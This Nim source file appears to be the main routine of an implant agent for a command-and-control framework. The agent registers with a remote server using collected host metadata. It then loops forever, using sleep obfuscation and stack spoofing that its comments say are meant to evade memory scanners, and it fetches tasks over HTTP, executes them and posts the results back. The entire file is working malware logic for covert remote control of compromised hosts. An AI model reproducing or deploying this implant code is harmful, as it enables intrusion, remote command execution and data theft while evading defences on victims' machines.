import strformat, os, times, system, base64, random

import core/[http, context, sleepmask, io]
import protocol/[task, result, heartbeat, registration]
import ../common/[types, utils, crypto]

proc main() = 
    randomize()

    # Initialize agent context
    var ctx = AgentCtx.init()
    if ctx == nil: 
        quit(0)

    # Create registration payload
    var registration: AgentRegistrationData = ctx.collectAgentMetadata()
    let registrationBytes = ctx.serializeRegistrationData(registration)

    if not ctx.httpPost(registrationBytes): 
        print("[-] Agent registration failed.")
        quit(0)
    print fmt"[+] [{ctx.agentId}] Agent registered."

    #[
        Agent routine: 
        1. Sleep Obfuscation
        2. Retrieve task from /tasks endpoint
        3. Execute task and post result to /results
        4. If additional tasks have been fetched, go to 2.
        5. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 
        # Sleep obfuscation to evade memory scanners
        sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        print "\n", fmt"[*] [{date}] Checking in."

        try: 
            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
            # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
            var heartbeat: Heartbeat = ctx.createHeartbeat()
            let 
                heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
                packet: string = ctx.httpGet(heartbeatBytes)

            if packet.len <= 0: 
                print("[*] No tasks to execute.")
                continue

            let tasks: seq[Task] = ctx.deserializePacket(packet)
            
            if tasks.len <= 0: 
                print("[*] No tasks to execute.")
                continue

            # Execute all retrieved tasks and return their output to the server
            for task in tasks: 
                var result: TaskResult = ctx.handleTask(task)
                let resultBytes: seq[byte] = ctx.serializeTaskResult(result)

                ctx.httpPost(resultBytes)

        except CatchableError as err: 
            print("[-] ", err.msg)

when isMainModule:
    main() 